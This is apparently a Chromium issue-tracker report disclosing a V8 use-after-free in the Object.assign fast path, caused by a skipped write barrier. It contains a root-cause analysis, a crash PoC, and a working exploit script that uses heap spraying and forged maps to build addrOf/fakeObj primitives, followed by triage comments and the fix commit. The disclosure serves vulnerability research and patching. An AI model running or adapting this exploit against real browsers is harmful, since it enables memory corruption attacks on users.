# Incorrect WriteBarrier Optimization in ObjectAssign FastPath Leads to Exploitable UAF Vulnerability

| Field | Value |
|-------|-------|
| **Issue ID** | [392521083](https://issues.chromium.org/issues/392521083) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ol...@chromium.org |
| **Created** | 2025-01-27 |
| **Bounty** | $50,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

## 1 Root Cause

I once reported a vulnerability related to the `Object.assign()` fast path. While reviewing the patch for the vulnerability, I revisited the relevant source code. The patch itself was fine, but the following code caught my attention.

```
template <typename Function>
TNode<Object> CodeStubAssembler::FastCloneJSObject(
    TNode<HeapObject> object,   
    TNode<Map> source_map,    
    TNode<Map> target_map, 
    const Function& materialize_target,
    bool target_is_new) {
  Label done_copy_properties(this), done_copy_elements(this);
  ...

  Label done_copy_used(this);
  auto EmitCopyLoop = [&](bool write_barrier) {
    ...
  };

  if (!target_is_new) {    // target_is_new=false
    Label if_no_write_barrier(this),
        if_needs_write_barrier(this, Label::kDeferred);

    // Determine if a write barrier is needed: if the kIsInYoungGenerationMask flag
    // is not set in the header of the page to which the target belongs,
    // then enter the if_needs_write_barrier branch, and a write barrier is needed.
    // Otherwise, enter the if_no_write_barrier branch, and no write barrier is needed.
    TNode<BoolT> needs_write_barrier = IsPageFlagReset(
        BitcastTaggedToWord(target), MemoryChunk::kIsInYoungGenerationMask);
    Branch(needs_write_barrier, &if_needs_write_barrier, &if_no_write_barrier);

    BIND(&if_needs_write_barrier);
    EmitCopyLoop(true);    // Generate a loop to copy properties, a write barrier will be generated when writing fields

    Goto(&done_copy_used);
    BIND(&if_no_write_barrier);
  }
  ...

  EmitCopyLoop(false);    // Writing properties without needing a write barrier will enter here
  Goto(&done_copy_used);

  return target;
}

```

Summary: When generating field write instructions for copying in-object properties, **if the object being written to belongs to the young space, the write instruction will not trigger a write barrier**.

This optimization is incorrect. Consider the following example:

- Suppose during incremental marking, `o1` belongs to the old space and has already been marked.
- Allocate an object `mark_obj` in the young space.
- Execute `o1.f = mark_obj`: This triggers a write barrier, causing `mark_obj` to be added to the worklist for incremental marking.
- Once incremental marking processes `mark_obj`, we have a marked object in the young space.
- Allocate another object `uaf = {}; uaf.f = uaf;`.
- At this point, using `Object.assign(mark_obj, uaf)` sets `mark_obj.f` to point to the object `uaf`. Note: **Since `mark_obj` is in the young space, this does not trigger a write barrier, and incremental marking considers `mark_obj` fully marked and will not revisit it, so the GC is unaware that `mark_obj.f` references `uaf`**.
- Later, setting `uaf = undefined` causes `uaf` to lose its reference and become garbage, and the GC will free the `uaf` object, making `mark_obj.f` a UAF pointer.

This is the general idea of how the vulnerability is triggered.

It is not difficult to see that this vulnerability originates from commit `f9f43bf94c5c910ff2518a7d68b674f1e9909c5f`, which was introduced in July 2024. I believe this vulnerability could affect Chrome.

## 2 Construct POC

Constructing POC is the biggest challenge of this vulnerability, as it requires an in-depth understanding of the V8 GC, which took me a week. Although the comments in `poc.js` are detailed enough, I want to highlight two key points.

### 2.1 publish worklist

During incremental marking, multiple worklists are involved:

1. A global worklist `MarkingWorklists`: When `MarkingWorklists::Local` is full, tasks are published to the global worklist; when `MarkingWorklists::Local` is empty, tasks are stolen from the global worklist.
2. `MarkingBarrier::current_worklists` is a local worklist: When a write barrier is triggered, `value` object which needs to be visited is placed in this local worklist.
3. `MarkCompactCollector::local_marking_worklists` is another local worklist: The incremental marking steps fetch and process objects from this worklist.

When constructing the POC, I discovered that if only execute `o1.f = mark_obj;`, then `mark_obj` will be placed in `MarkingBarrier::current_worklists`. Since it is not published to the global worklist, no matter how many times the incremental marking step is triggered afterward, the incremental marking process will never access `mark_obj`.

```
let mark_obj = {};
o1.f = mark_obj;
%DebugPrint(o1);

```

To solve this problem, I added a large number of tasks to `MarkingBarrier::current_worklists`. Since the capacity of `MarkingBarrier::current_worklists` is only 64, the tasks are quickly published to the global worklist. This allows subsequent incremental marking steps to access `mark_obj`.

```
for (let i = 0; i < 70; i++) {
    print(i);
    o1[i] = {};
}

```
### 2.2 Allocate Object Without Triggering Write Barriers

After constructing a `mark_obj` object that has been visited and is located in the young space, we need to acquire a `uaf` object to trigger the UAF vulnerability. This object must be created without triggering the write barrier because we need the incremental marking process to assume that the `uaf` object has no references.

Once incremental marking is enabled, executing `uaf.f = uaf;` will directly trigger the write barrier, preventing the `uaf` object from being freed.

```
    let uaf = {};
    uaf.f = uaf;

```

To solve this problem, I took advantage of Maglev's optimization for the write barrier. When building the Maglev Graph, **if both the `object` and `value` are in the young space and belong to the same allocation block, the write barrier is eliminated.**

```
bool MaglevGraphBuilder::CanElideWriteBarrier(ValueNode* object,
                                              ValueNode* value) {
  ...

  // No need for a write barrier if both object and value are part of the same
  // folded young allocation.
  AllocationBlock* allocation = GetAllocation(object); 
  if (allocation != nullptr &&    // Here eliminate write barrier
      allocation->allocation_type() == AllocationType::kYoung &&   
      allocation == GetAllocation(value)) { 
    return true;
  }
  ...
  return false;
}

```

For `uaf.f = uaf`, both `object` and `value` are the `uaf` object, and since `uaf` is allocated in the young space, the write barrier is not triggered.

With the help of Maglev, we can create an object without triggering the write barrier and allow the GC to free it. This corresponds to the following part of the POC.

```
function generateUafObj(mark_obj) {
    /*
        uaf is allocated in Young Space. uaf.f = uaf will not trigger a write barrier after Maglev optimization.
        Object.assign(mark_obj, uaf) also does not trigger a write barrier.
        Therefore, after the function completes, GC will consider uaf unreferenced and collect it.
    */
    let uaf = {};
    uaf.f = uaf;
    
    /*
        Object.assign() writes to mark_obj.
        Since mark_obj is in young space, it does not trigger a write barrier.
    */
    Object.assign(mark_obj, uaf);
}
%PrepareFunctionForOptimization(generateUafObj);
generateUafObj({});
%OptimizeMaglevOnNextCall(generateUafObj);  // Both Maglev and Turbofan optimizations work
generateUafObj(mark_obj);

```
## 3 Exploit

For this UAF vulnerability, exploitation can be challenging without any known addresses. Therefore, I first allocated a large array of floating-point numbers, `large_arr`, whose elements' backing storage is located in the large space. The address of these elements is fixed and predictable, depending only on the version of V8.

With a known address, I used the concept of **array overlap** to exploit the vulnerability:

- First, I performed heap spraying to allocate many floating-point number arrays. These arrays need to hit the memory location pointed to by the UAF pointer `mark_obj.f`, allowing us to forge arbitrary objects and then read them out through `mark_obj.f`.
- Then, I placed an implicit class with the `elements kind` of `PACKED_ELEMENTS` in `large_arr`, whose address is known.
- Next, I forged `mark_obj.f` to appear as an object array:
  
  - Set the `map` field of `mark_obj.f` to point to the implicit class in `large_arr`, pretending it is a `PACKED_ELEMENTS` array.
  - Set the `elements` field of `mark_obj.f` to point to a location in `large_arr`, assuming the address is `X`.
- This successfully creates an overlap between the floating-point number array and the object pointer array:
  
  - The memory at `X` is treated as `Elements` storing tagged pointers by the object array `mark_obj.f`.
  - Simultaneously, `X` is treated as `Elements` storing floating-point numbers by the floating-point number array `large_arr`.
- This provides the `addrOf` and `fakeObj` primitives:
  
  - By writing the pointer of an object `obj` into `X` via `mark_obj.f[0]` and reading it as a floating-point number through `large_arr[6]`, `addrOf` can be achieved.
  - Conversely, by writing a pointer into `X` through `large_arr[6]` and then reading it through `mark_obj.f[0]`, a fake object can be created.

exp.js

```
print("main begin");

// The address of the elements of large_arr is predicatable
const large_arr = new Array(0x400000);
large_arr.fill(1.1);

// The following three TypedArrays share the same underlying byte sequence buffer
var f64 = new Float64Array(1);   
var bigUint64 = new BigUint64Array(f64.buffer); 
var u32 = new Uint32Array(f64.buffer);

let o1 = {f: 0};

// Add sidestep transitions so that the second execution of Object.assign() will enter the fast path
print("assign 1");
let from = {};
from.f = from;
Object.assign({}, from);

/*
    Initialization may allocate objects, which could trigger increasing marking. 
    To avoid interference, we first wait here for the incremental marking to complete.
    Major GC will call PreciseCollectAllGarbage(),
    which will call FinalizeIncrementalMarkingAtomically() to finalize incremental marking.
*/
gc({type: "major"});

// Preparation work is complete
print("prepare fin");

/*
    Start incremental marking.
    According to Heap::CollectGarbage(),
    after a minor GC, StartIncrementalMarkingIfAllocationLimitIsReached() 
    will be called to attempt to start incremental marking.
    Since --stress-incremental-marking is set, 
    IncrementalMarkingLimitReached() returns kHardLimit.
*/
gc({type: "minor"});

/*
    Allocate a new object in the young space.
    Write a property, triggering a write barrier.
    mark_obj is pushed into MarkingBarrier::current_worklists.
*/
let mark_obj = {};
o1.f = mark_obj;
%DebugPrint(o1);

/*
    Trigger many write barriers, causing MarkingBarrier::current_worklists 
    to fill up and overflow into the global marking worklist.
*/
for (let i = 0; i < 70; i++) {
    print(i);
    o1[i] = {};
}
print("write barrier trigger finish");

/*
    Trigger an incremental marking step, causing mark_obj to be marked.
*/
for (let i = 0; i < 1; i++) {
    print(i);

    /*
        Facts:
            1. new Array(N) generates two Young Space allocation requests: 0x10 and (N*4+4).
            2. If the size of the allocated object is > 0x20000, it outputs "large space".
            3. The maximum size of young space is only 0xfffc.
        Therefore:
            1. new Array(0x4000) generates two Young Space allocation requests: 0x10 and 0x10008.
            2. Young space cannot handle this, so each allocation will enter the Slow Path: AllocateRawSlow().
            3. Each memory allocation will trigger InvokeAllocationObservers(), reaching the threshold each time, 
               thus triggering an incremental marking step.
    */
    new Array(0x4000);
}

function generateUafObj(mark_obj) {
    /*
        uaf is allocated in Young Space. uaf.f = uaf will not trigger a write barrier after Maglev optimization.
        Object.assign(mark_obj, uaf) also does not trigger a write barrier.
        Therefore, after the function completes, GC will consider uaf unreferenced and collect it.
    */
    let uaf = {};
    uaf.f = uaf;
    
    /*
        Object.assign() writes to mark_obj.
        Since mark_obj is in young space, it does not trigger a write barrier.
    */
    Object.assign(mark_obj, uaf);
}
%PrepareFunctionForOptimization(generateUafObj);
generateUafObj({});
%OptimizeMaglevOnNextCall(generateUafObj);  // Both Maglev and Turbofan optimizations work
generateUafObj(mark_obj);

/*
    Trigger two GCs:
        1. The first GC is used to stop incremental marking:
            Since mark_obj.f -> uaf did not trigger a write barrier and mark_obj has already been marked,
            MarkCompact does not know that uaf is still referenced, so uaf is freed, and mark_obj.f becomes a UAF pointer.
        2. The second GC will crash when processing mark_obj.f because it points to 0xbeadbeef.
*/
gc({type: "major"});

function pwn() {    // Place the exploitation process in this function to avoid interfering with the heap feng shui above

    // heap spray: Spray double arrays to cover the memory area pointed to by mark_obj.f
    const arr = [];
    for(let i=0; i<35; i++) {
        /*
            Hex representation of double array: [0x000000CC00000000, 0x000000CC00000001, 0x000000CC00000002, 0x000000CC00000003, ...]
            This helps determine the offset of the heap spray
        */
        arr.push([1.01e-321, 2.121995892e-314, 4.2439916827e-314, 6.3659874737e-314, 8.4879832647e-314, 1.06099790556e-313, 1.27319748466e-313, 1.48539706375e-313, 1.69759664285e-313, 1.90979622195e-313, 2.12199580104e-313, 2.33419538014e-313, 2.54639495924e-313, 2.75859453833e-313, 2.97079411743e-313, 3.18299369653e-313, 3.3951932756e-313, 3.6073928547e-313, 3.8195924338e-313, 4.0317920129e-313, 4.243991592e-313, 4.4561911711e-313, 4.6683907502e-313, 4.8805903293e-313, 5.0927899084e-313, 5.3049894875e-313, 5.5171890666e-313, 5.7293886457e-313, 5.9415882248e-313, 6.1537878039e-313, 6.36598738297e-313, 6.57818696207e-313, 6.79038654117e-313, 7.00258612026e-313, 7.21478569936e-313, 7.42698527846e-313, 7.63918485755e-313, 7.85138443665e-313, 8.06358401575e-313, 8.27578359484e-313, 8.48798317394e-313, 8.70018275304e-313, 8.91238233213e-313, 9.12458191123e-313, 9.33678149033e-313, 9.5489810694e-313, 9.7611806485e-313, 9.9733802276e-313, 1.01855798067e-312, 1.03977793858e-312, 1.06099789649e-312, 1.0822178544e-312, 1.10343781231e-312, 1.12465777022e-312, 1.14587772813e-312, 1.16709768604e-312, 1.18831764395e-312, 1.20953760186e-312, 1.23075755977e-312, 1.251977517677e-312, 1.273197475587e-312, 1.294417433497e-312, 1.315637391406e-312, 1.336857349316e-312, 1.358077307226e-312, 1.379297265135e-312, 1.400517223045e-312, 1.421737180955e-312, 1.442957138864e-312, 1.464177096774e-312, 1.485397054684e-312, 1.506617012593e-312, 1.527836970503e-312, 1.549056928413e-312, 1.57027688632e-312, 1.59149684423e-312, 1.61271680214e-312, 1.63393676005e-312, 1.65515671796e-312, 1.67637667587e-312, 1.69759663378e-312, 1.71881659169e-312, 1.7400365496e-312, 1.76125650751e-312, 1.78247646542e-312, 1.80369642333e-312, 1.82491638124e-312, 1.84613633915e-312, 1.867356297057e-312, 1.888576254967e-312, 1.909796212877e-312, 1.931016170786e-312, 1.952236128696e-312, 1.973456086606e-312, 1.994676044515e-312, 2.015896002425e-312, 2.037115960335e-312, 2.058335918244e-312, 2.079555876154e-312, 2.100775834064e-312, 2.121995791973e-312, 2.143215749883e-312, 2.164435707792e-312, 2.1856556657e-312, 2.20687562361e-312, 2.22809558152e-312, 2.24931553943e-312, 2.27053549734e-312, 2.29175545525e-312, 2.31297541316e-312, 2.33419537107e-312, 2.35541532898e-312, 2.37663528689e-312, 2.3978552448e-312, 2.41907520271e-312, 2.44029516062e-312, 2.46151511853e-312, 2.482735076437e-312, 2.503955034347e-312, 2.525174992257e-312, 2.546394950166e-312, 2.567614908076e-312, 2.588834865986e-312, 2.610054823895e-312, 2.631274781805e-312, 2.652494739714e-312, 2.673714697624e-312, 2.694934655534e-312, 2.716154613443e-312, 2.737374571353e-312, 2.758594529263e-312, 2.77981448717e-312, 2.80103444508e-312, 2.82225440299e-312, 2.8434743609e-312, 2.86469431881e-312, 2.88591427672e-312, 2.90713423463e-312, 2.92835419254e-312, 2.94957415045e-312, 2.97079410836e-312, 2.99201406627e-312, 3.01323402418e-312, 3.03445398209e-312, 3.05567394e-312, 3.07689389791e-312, 3.098113855817e-312, 3.119333813727e-312, 3.140553771636e-312, 3.161773729546e-312, 3.182993687456e-312, 3.204213645365e-312, 3.225433603275e-312, 3.246653561185e-312, 3.267873519094e-312, 3.289093477004e-312, 3.310313434914e-312, 3.331533392823e-312, 3.352753350733e-312, 3.373973308643e-312, 3.39519326655e-312, 3.41641322446e-312, 3.43763318237e-312, 3.45885314028e-312, 3.48007309819e-312, 3.5012930561e-312, 3.52251301401e-312, 3.54373297192e-312, 3.56495292983e-312, 3.58617288774e-312, 3.60739284565e-312, 3.62861280356e-312, 3.64983276147e-312, 3.67105271938e-312, 3.692272677287e-312, 3.713492635197e-312, 3.734712593107e-312, 3.755932551016e-312, 3.777152508926e-312, 3.798372466836e-312, 3.819592424745e-312, 3.840812382655e-312, 3.862032340565e-312, 3.883252298474e-312, 3.904472256384e-312, 3.925692214294e-312, 3.946912172203e-312, 3.968132130113e-312, 3.989352088023e-312, 4.01057204593e-312, 4.03179200384e-312, 4.05301196175e-312, 4.07423191966e-312, 4.09545187757e-312, 4.11667183548e-312, 4.13789179339e-312, 4.1591117513e-312, 4.18033170921e-312, 4.20155166712e-312, 4.22277162503e-312, 4.24399158294e-312, 4.26521154085e-312, 4.28643149876e-312, 4.307651456667e-312, 4.328871414577e-312, 4.350091372487e-312, 4.371311330396e-312, 4.392531288306e-312, 4.413751246216e-312, 4.434971204125e-312, 4.456191162035e-312, 4.477411119945e-312, 4.498631077854e-312, 4.519851035764e-312, 4.541070993674e-312, 4.562290951583e-312, 4.583510909493e-312, 4.604730867403e-312, 4.62595082531e-312, 4.64717078322e-312, 4.66839074113e-312, 4.68961069904e-312, 4.71083065695e-312, 4.73205061486e-312, 4.75327057277e-312, 4.77449053068e-312, 4.79571048859e-312, 4.8169304465e-312, 4.83815040441e-312, 4.85937036232e-312, 4.88059032023e-312, 4.90181027814e-312, 4.923030236047e-312, 4.944250193957e-312, 4.965470151867e-312, 4.986690109776e-312, 5.007910067686e-312, 5.029130025596e-312, 5.050349983505e-312, 5.071569941415e-312, 5.092789899325e-312, 5.114009857234e-312, 5.135229815144e-312, 5.156449773054e-312, 5.177669730963e-312, 5.198889688873e-312, 5.22010964678e-312, 5.24132960469e-312, 5.2625495626e-312, 5.28376952051e-312, 5.30498947842e-312, 5.32620943633e-312, 5.34742939424e-312, 5.36864935215e-312, 5.38986931006e-312, 5.41108926797e-312]);
    }
    
    /*
        Some fixed addresses:
            - 0x00000745: <FixedArray[0]>
            - The address of job(large_arr)->elements is fixed at 0x01540010
                Since the map and length fields of FixedDoubleArray occupy 8B,
                the address corresponding to large_arr[0] is 0x01540010+0x8
                Used to forge implicit classes and elements backing storage
    */
    // map for obj array, elements kind: PACKED_ELEMENTS
    large_arr[0] = 1.41605960412299e-72;            // <= 0x01540018
    large_arr[1] = 1.6291487790915354e-260;
    large_arr[2] = 3.455027181665854e-308;
    large_arr[3] = 3.982986903983e-311;
    large_arr[4] = 3.4552563564090363e-308;

    // large_arr[5] is used as the elements backing storage for both double arrays and object arrays
    // large_arr[5]                                // <= 0x01540018+0x28
    // large_arr[6]                                // <= 0x01540018+0x30
    
    // arr[32][0xd3] corresponds to the memory pointed to by mark_obj.f
    u32[0] = 0x01540019;            // job(mark_obj.f)->map = map(PACKED_ELEMENTS)
    u32[1] = 0x00000745;            // job(mark_obj.f)->properties = FixedArray[0] 
    arr[32][0xd3] = f64[0];          
    u32[0] = 0x01540019+0x28;        // job(mark_obj.f)->elements = buffer in large_arr
    arr[32][0xd4] = f64[0];

    /*
        Successfully constructed array overlap:
            - large_arr[6] can be read and written as a float
            - large_arr[6] is also used by mark_obj.f as the elements backing storage for an object array
        Therefore, we can easily implement addrOf and fakeObj primitives
    */
    function addrOf(obj) {
        // Write the object address
        mark_obj.f[0] = obj;
        // Read the object address as a float
        f64[0] = large_arr[6];
        return u32[0];
    }
    
    function fakeObj(addr) {
        // Write the object pointer as a float
        u32[0] = addr;
        large_arr[6] = f64[0];
        // Read it out as an object pointer
        return mark_obj.f[0];
    }
        
    // Perform specific operations within test to prevent new objects from interfering with heap spray
    function test() {
        let obj = {};
        %DebugPrint(obj);

        // test addrOf()
        const obj_addr = addrOf(obj);
        print(obj_addr);

        // test fakeObj()
        const another_obj = fakeObj(obj_addr);
        %DebugPrint(another_obj);
    }
    test();

}
pwn();

// Avoid executing microtasks
print("main fin =========");
%SystemBreak();

```

Using a release build of `d8` to execute `exp.js`, you can see that the `fakeObj` and `addrOf` primitives work correctly. Subsequently, an attacker can proceed to attempt escaping the V8 heap sandbox.

Unfortunately, the heap spraying in `exp.js` is not perfect and relies on `--predictable` to work correctly. In the future, heap scanning techniques could improve the stability of the heap spray, but it should be sufficient to demonstrate the exploitability of this vulnerability.

```
./d8 \
    --expose-gc \
    --allow-natives-syntax \
    --predictable \
    --single-threaded \
    --stress-incremental-marking \
    ./exp.js

```

VERSION

`poc.js` and `exp.js` has been tested on lastest v8, commit: `c59dbe2064d3bbecc936def9e4e77182e708f681`

If the PoC or exploit cannot be reproduced, it might be due to differences in compilation flags causing heap feng shui to fail. You can refer to the compilation configuration I used.

BUILD.gn for compiling a debug version of V8:

```
is_debug = true
target_cpu = "x64"
v8_enable_sandbox = true

v8_enable_backtrace = true
v8_enable_slow_dchecks = true

v8_enable_object_print=true
v8_enable_verify_heap=true
v8_monolithic=true
is_component_build=false
v8_use_external_startup_data=false
v8_optimized_debug = false

```

BUILD.gn for compiling a release version of V8:

```
is_debug = false
v8_code_comments = true

v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true

v8_monolithic=true
is_component_build=false
v8_use_external_startup_data=false
target_cpu = "x64"

v8_enable_sandbox = true

```

REPRODUCTION CASE

`poc.js`

```
print("main begin");

let o1 = {f: 0};

// Add sidestep transitions so that the second execution of Object.assign() will enter the fast path
print("assign 1");
let from = {};
from.f = from;
Object.assign({}, from);

/*
    Initialization may allocate objects, which could trigger increasing marking. 
    To avoid interference, we first wait here for the incremental marking to complete.
    Major GC will call PreciseCollectAllGarbage(),
    which will call FinalizeIncrementalMarkingAtomically() to finalize incremental marking.
*/
gc({type: "major"});

// Preparation work is complete
print("prepare fin");

/*
    Start incremental marking.
    According to Heap::CollectGarbage(),
    after a minor GC, StartIncrementalMarkingIfAllocationLimitIsReached() 
    will be called to attempt to start incremental marking.
    Since --stress-incremental-marking is set, 
    IncrementalMarkingLimitReached() returns kHardLimit.
*/
gc({type: "minor"});

/*
    Allocate a new object in the young space.
    Write a property, triggering a write barrier.
    mark_obj is pushed into MarkingBarrier::current_worklists.
*/
let mark_obj = {};
o1.f = mark_obj;
%DebugPrint(o1);

/*
    Trigger many write barriers, causing MarkingBarrier::current_worklists 
    to fill up and overflow into the global marking worklist.
*/
for (let i = 0; i < 70; i++) {
    print(i);
    o1[i] = {};
}
print("write barrier trigger finish");

/*
    Trigger an incremental marking step, causing mark_obj to be marked.
*/
for (let i = 0; i < 1; i++) {
    print(i);

    /*
        Facts:
            1. new Array(N) generates two Young Space allocation requests: 0x10 and (N*4+4).
            2. If the size of the allocated object is > 0x20000, it outputs "large space".
            3. The maximum size of young space is only 0xfffc.
        Therefore:
            1. new Array(0x4000) generates two Young Space allocation requests: 0x10 and 0x10008.
            2. Young space cannot handle this, so each allocation will enter the Slow Path: AllocateRawSlow().
            3. Each memory allocation will trigger InvokeAllocationObservers(), reaching the threshold each time, 
               thus triggering an incremental marking step.
    */
    new Array(0x4000);
}

function generateUafObj(mark_obj) {
    /*
        uaf is allocated in Young Space. uaf.f = uaf will not trigger a write barrier after Maglev optimization.
        Object.assign(mark_obj, uaf) also does not trigger a write barrier.
        Therefore, after the function completes, GC will consider uaf unreferenced and collect it.
    */
    let uaf = {};
    uaf.f = uaf;
    
    /*
        Object.assign() writes to mark_obj.
        Since mark_obj is in young space, it does not trigger a write barrier.
    */
    Object.assign(mark_obj, uaf);
}
%PrepareFunctionForOptimization(generateUafObj);
generateUafObj({});
%OptimizeMaglevOnNextCall(generateUafObj);  // Both Maglev and Turbofan optimizations work
generateUafObj(mark_obj);

/*
    Trigger two GCs:
        1. The first GC is used to stop incremental marking:
            Since mark_obj.f -> uaf did not trigger a write barrier and mark_obj has already been marked,
            MarkCompact does not know that uaf is still referenced, so uaf is freed, and mark_obj.f becomes a UAF pointer.
        2. The second GC will crash when processing mark_obj.f because it points to 0xbeadbeef.
*/
gc({type: "major"});

// Avoid executing microtasks
print("main fin =========");
%SystemBreak();

```

Run the `poc.js` using the following command:

```
./d8 \
    --expose-gc \
    --allow-natives-syntax \
    --single-threaded \
    --stress-incremental-marking \
    ./poc.js

```

A segmentation fault will occur.

```
Received signal 11 SEGV_ACCERR 35c0beadbef6

```

Note: The `--single-threaded` and `--stress-incremental-marking` flags are necessary. The PoC requires precise heap feng shui, and these flags make the incremental marking process simpler and easier to trigger.

CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: 303f06e3

## Timeline

### cl...@appspot.gserviceaccount.com (2025-01-27)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6596803809968128.

### aj...@google.com (2025-01-27)

On Windows my d8 asan only hits the systembreak:-

```
        v8::base::OS::DebugBreak [0x00007FF746B14B66+6] (D:\chromium\src\v8\src\base\platform\platform-win32.cc:1270)
        v8::internal::Runtime_SystemBreak [0x00007FF7430E7B92+194] (D:\chromium\src\v8\src\runtime\runtime-test.cc:1473)
        Builtins_CEntry_Return1_ArgvInRegister_NoBuiltinExit [0x00007FF7471A4335+53]
        Builtins_CallRuntimeHandler [0x00007FF7472A5288+72]
        Builtins_InterpreterEntryTrampoline [0x00007FF7470FCE75+309]
        Builtins_JSEntryTrampoline [0x00007FF7470FA95C+92]
        Builtins_JSEntry [0x00007FF7470FA4BF+255]
        v8::internal::`anonymous namespace'::Invoke [0x00007FF741558006+6870] (D:\chromium\src\v8\src\execution\execution.cc:437)
        v8::internal::Execution::CallScript [0x00007FF74155B8D8+712] (D:\chromium\src\v8\src\execution\execution.cc:537)
        v8::Script::Run [0x00007FF740E8D7EA+3418] (D:\chromium\src\v8\src\api\api.cc:2147)
        v8::Script::Run [0x00007FF740E8CA83+19] (D:\chromium\src\v8\src\api\api.cc:2110)
        v8::Shell::ExecuteString [0x00007FF740DD958E+4414] (D:\chromium\src\v8\src\d8\d8.cc:1017)
        v8::SourceGroup::Execute [0x00007FF740E1EFBD+1901] (D:\chromium\src\v8\src\d8\d8.cc:4959)
        v8::Shell::RunMainIsolate [0x00007FF740E2D19E+1262] (D:\chromium\src\v8\src\d8\d8.cc:5904)
        v8::Shell::RunMain [0x00007FF740E2C5BC+924] (D:\chromium\src\v8\src\d8\d8.cc:5812)
        v8::Shell::Main [0x00007FF740E31BD9+10969] (D:\chromium\src\v8\src\d8\d8.cc:6668)
        __scrt_common_main_seh [0x00007FF7472E600C+268] (D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288)
        BaseThreadInitThunk [0x00007FF821FE259D+29]
        RtlUserThreadStart [0x00007FF8236AAF38+40]

```

but let's see what CF sees, tentatively sending to v8 for further investigation.

### aj...@google.com (2025-01-27)

cannot set foundin without a repro or bisect

### is...@chromium.org (2025-01-27)

Thank you for the report!

Oli, PTAL.

### 24...@project.gserviceaccount.com (2025-01-27)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-01-27)

Detailed Report: https://clusterfuzz.com/testcase?key=6596803809968128

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  HeapLayout::InReadOnlySpace(heap_object) || (v8_flags.black_allocated_pages && H
  v8::internal::FullMarkingVerifier::VerifyHeapObjectImpl
  v8::internal::FullMarkingVerifier::VerifyPointers
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=94893:94894

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6596803809968128

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### hu...@gmail.com (2025-01-28)

The crash in CF is different from the one in my report because CF has added the `--verify-heap` flag, which checks whether pointers are valid during GC. In my report, the `--verify-heap` flag is absent, so the program continues to run after GC until it accesses `0xbeadbeef`, triggering a segmentation fault. Therefore, they triggered the same vulnerability, but the resulting crashes were different.

### ml...@chromium.org (2025-01-28)

> At this point, using Object.assign(mark\_obj, uaf) sets mark\_obj.f to point to the object uaf. Note: Since mark\_obj is in the young space, this does not trigger a write barrier, and incremental marking considers mark\_obj fully marked and will not revisit it, so the GC is unaware that mark\_obj.f references uaf.

^^^^ this is the problem

Only the last object allocated in the young generation is allowed to skip barriers. Every subsequent allocation may publish the young object to the marker which then subsequently requires write barriers.

### pe...@google.com (2025-01-28)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2025-01-28)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ap...@google.com (2025-01-29)

Project: v8/v8  

Branch: main  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6206727>

[runtime] Fix write barrier check in FastCloneJSObject

---


Expand for full commit details
```
[runtime] Fix write barrier check in FastCloneJSObject 
 
Add missing check for page being marked. 
 
Fixed: 392521083 
Change-Id: I3c0838f608052a2f5d9253de718aea1860fe2a42 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6206727 
Reviewed-by: Igor Sheludko <ishell@chromium.org> 
Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98377}

```

---

Files:

- M `src/codegen/code-stub-assembler-inl.h`
- M `src/codegen/code-stub-assembler.cc`
- M `src/codegen/code-stub-assembler.h`
- M `src/runtime/runtime-test.cc`
- M `src/runtime/runtime.h`

---

Hash: ce071a295e54b32bf7f03373da943678231cb1ee  

Date:  Tue Jan 28 15:18:22 2025


---

### ol...@chromium.org (2025-01-29)

@303f06e3 thanks for that one. Excellent work as always.

### pe...@google.com (2025-01-29)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ap...@google.com (2025-01-29)

[Details redacted due to bug visibility]

Change-Id: Idc7778ee58dc7707be20b71fd058684bacc9bfac
https://chrome-internal-review.googlesource.com/7984909


### pe...@google.com (2025-01-29)

